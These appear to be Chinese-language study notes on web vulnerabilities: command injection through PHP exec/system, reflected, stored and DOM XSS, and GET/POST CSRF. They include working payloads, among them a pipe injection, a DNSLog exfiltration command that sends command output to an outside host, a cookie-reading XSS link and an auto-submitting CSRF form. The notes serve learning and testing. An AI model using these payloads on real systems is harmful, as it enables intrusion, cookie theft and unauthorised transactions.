# 命令执行漏洞
当服务器对用户输入的命令没有进行限制或者过滤不严，导致用户可以控制命令执行函数时，就会造成用户输入的命令执行漏洞。属于高危漏洞。

1. 常用的PHP命令执行函数
- exec函数

    `exec(string $command[,array &$output[,int &$return_var]]):string`
    exec执行command参数所指定的命令，并且输出执行结果。

    `echo exec($_REQUEST[1]);`这个命令中，我们传入`?=command`就可以让服务器执行command命令并打印出最后一行结果。
- system函数

    `system(string $command[,int &$return_var]):string`执行command命令，并把所有结果输出到屏幕上（但只返回最后一行结果）。
- shell_exec函数

    `shell_exec(string $command):string`通过shell环境执行命令，并将完整的输出以字符串的方式返回（也就是说需要echo打印），若出错或无输出，返回NULL。
2. Linux命令执行基础

|符号|说明|
|----|----|
|A;B|A无论是否正确都会执行B|
|A&B|A后台运行，A和B可同时执行|
|A&&B|A执行成功时才会执行B|
|A\|B|A的结果作为B的参数，A不论是否正确都会执行B|
|A\|\|B|A执行失败时才会执行B|
- 一般来说，用A|B而不是A;B

3. 漏洞实战
    
    假设我们发现了一个0网络功能测试接口页面 （ping）
- 简单（有回显）的命令执行
    
    输入点输入`127.0.0.1|command`即可执行command
- 无回显的命令执行

    可以尝试外带信息。首先在dnslog.cn里申请一个临时域名xxx.dnslog.cn

    输入点输入`127.0.0.1|ping $(command).xxx.dnslog.cn`

    payload中的\$()也可以换成一对反引号。扫描到\$()或反引号时：Shell 会立刻停下手中的工作，开启一个“子进程”去跑括号里的命令,跑完后shell会把执行结果塞到原来的位置。

    运行后，在dnslog.cn上刷新一下，即可看到外带消息。原理是为了执行 ping，服务器必须先知道 result.xxx.dnslog.cn 的 IP 地址。于是它向 DNS 服务器发出了查询请求。DNSLog 平台的后台接收到了这个请求，它会显示一条记录：

    查询域名： result.ibsda6s.dnslog.cn | 源IP： 目标服务器IP

    而这个result就是我们command的执行结果。

# XSS跨站脚本攻击

是指攻击者通过特殊手段向网页中插入了恶意脚本，在用户浏览网页时，利用用户浏览器发起Cookie资料窃取、会话劫持、钓鱼欺骗等攻击。

反射型是后端有漏洞，DOM型是前端有漏洞，存储型是前后端都有，主要是后端。

1. 反射型XSS（也称作非持久型）
    
    基于URL参数的反射XSS攻击原理

    ①构造恶意 URL：攻击者在 URL 参数中嵌入恶意脚本。
    
    ②诱使用户访问：通过钓鱼邮件、即时消息等方式发送恶意链接。
    
    ③服务器未过滤：服务器接收参数后，直接将参数内容拼接至 HTML 响应中。
    
    ④浏览器执行脚本：用户浏览器解析 HTML 时，执行嵌入的恶意脚本。

    还有很多种反射型XSS，用到再搜。
2. 存储型XSS

    与反射型XSS的差别仅在于，提交的XSS代码会存储在服务器端，下次请求目标页面时不用再提交XSS代码。

    隐蔽，危害也比较大。
3. DOM型XSS

    与前两个的差别是，此类攻击不需要**服务器**解析响应的直接参与，而是靠**浏览器端**的DOM解析，可以认为完全是客户端的事。

    ①黑客发现漏洞：黑客发现某个网站的 JS 脚本会读取 URL 里的内容并写进页面。
    
    例如：`http://safe-site.com/welcome.html` 有段 JS：
    
    `document.body.innerHTML = "欢迎，" + decodeURIComponent(window.location.hash);`

    - window.location.hash这是浏览器提供的一个 API，专门用来获取 URL 中 # 号及其后面的部分（在 Web 开发中被称为“锚点”或 Fragment）。

    ②构造恶意链接：黑客构造一个带“毒”的链接：
    `http://safe-site.com/welcome.html#<img src=x onerror=alert(document.cookie)>`

    ③发送链接：黑客通过邮件、社交软件或伪装成中奖信息发给受害者。

    ④受害者点击恶意链接：受害者的浏览器请求 safe-site.com。

    - 重点：根据 HTTP 协议，# 号后面的内容（Fragment）不会发送给服务器。所以服务器返回的是正常的 welcome.html。

    ⑤页面加载完成后，浏览器本地的 JS 开始跑，它读取了 # 后面的脚本，并用 innerHTML 把这段代码放进了页面进行渲染。脚本在受害者的浏览器里执行了。
### 补充：一个URL的一生
假设用户访问：`https://example.com/search?q=Apple`

服务器端（后端）跑一遍：

- 接收：服务器收到请求，解析出参数 q = Apple。

- 逻辑：去数据库查“Apple”相关的数据。

- 生成：把结果填进 HTML 模板（比如 Java 的 JSP 或 Python 的 Jinja2）。

- 响应：把生成的整个 HTML 字符串发回给浏览器。

浏览器端（客户端）跑一遍：

- 解析：浏览器拿到 HTML 字符串，开始构建网页。

- 执行脚本：浏览器看到 HTML 里的 \<script\> 标签，开始运行里面的 JavaScript 代码（比如加载图片、绑定按钮点击事件）。

- 动态渲染：JS 可能会根据 URL 里的 q=Apple 动态在页面上显示“您搜索的是：Apple”。
# CSRF跨站请求伪造
cross-site request forgery，简单的说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己（受害者）以前认证过的站点并运行一些操作（如发邮件，发消息，甚至财产操作（如转账和购买商品））。因为浏览器之前认证过，所以被访问的站点会觉得这是真正的用户操作而去运行。

所以要被CSRF攻击，必须同时满足两个条件：

- 登录受信任网站A，并在本地生成Cookie。
- 在不登出A的情况下，访问危险网站B。

1. GET型CSRF

    仅仅须要一个HTTP请求。就能够构造一次简单的CSRF。

    样例：

    银行站点A：它以GET请求来完毕银行转账的操作，如：

    `http://www.mybank.com/Transfer.php?toBankId=11&money=1000`

    危险站点B：它里面有一段HTML的代码例如以下：

    `<img src=http://www.mybank.com/Transfer.php?toBankId=11&money=1000>`

    首先，受害者登录了银行站点A，然后访问危险站点B。那么受害者将会向ID为11的用户转账1000元。
2. POST型CSRF
    
    稍微繁琐一点，需要攻击者自己在一个页面中构造好一个表单表单，然后使用JavaScript自动提交这个表单，最后引导用户访问这个页面。

    比如，有一个购买业务接口为:

    `/coures/user/handler/666/buy.php`
    
    通过提交表单，buy.php处理购买的信息，这里的666为视频ID。那么攻击者现在构造一个链接，链接中包含以下内容。
    ```
    <form action=/coures/user/handler/666/buy method=POST>
    <input type="text" name="xx" value="xx" />
    </form>
    <script> document.forms[0].submit(); </script> 
    ```
    当用户访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作，自动购买了id为666的视频，从而导致受害者余额扣除。其中，最后一行的作用是自动提交表单。
3. CSRF型漏洞挖掘

    1. 最简单的方法就是抓取一个正常请求的数据包，如果没有Referer字段和token，那么极有可能存在CSRF漏洞。

    2. 如果有Referer字段，但是去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。

    3. 随着对CSRF漏洞研究的不断深入，不断涌现出一些专门针对CSRF漏洞进行检测的工具，如CSRFTester，CSRF Request Builder等。以CSRFTester工具为例，CSRF漏洞检测工具的测试原理如下:使用CSRFTester进行测试时，首先需要抓取我们在浏览器中访问过的所有链接以及所有的表单等信息，然后通过在CSRFTester中修改相应的表单等信息，重新提交，这相当于一次伪造客户端请求。如果修改后的测试请求成功被网站服务器接受，则说明存在CSRF漏洞，当然此款工具也可以被用来进行CSRF攻击。